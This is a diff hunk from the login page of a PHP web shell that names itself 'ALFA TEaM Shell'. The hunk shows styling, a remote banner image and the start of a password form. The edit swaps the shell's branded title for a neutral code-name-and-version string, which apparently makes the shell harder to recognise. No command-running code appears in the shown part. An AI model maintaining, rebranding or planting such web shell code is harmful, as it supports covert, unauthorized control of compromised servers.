@@ -526,11 +526,11 @@ body{background: black;}
 #loginbox { font-size:11px; color:red; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<title>'.__ALFA_CODE_NAME__.' v ~'.__ALFA_VERSION__.'</title><center>
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://img1.picmix.com/output/stamp/normal/7/8/1/2/2632187_eb532.gif" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="red"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="red" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
+<tr><td bgcolor="red"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="red" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>'.__ALFA_CODE_NAME__.' v ~'.__ALFA_VERSION__.'</b></font></th></tr>
 <tr><td bgcolor="black" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
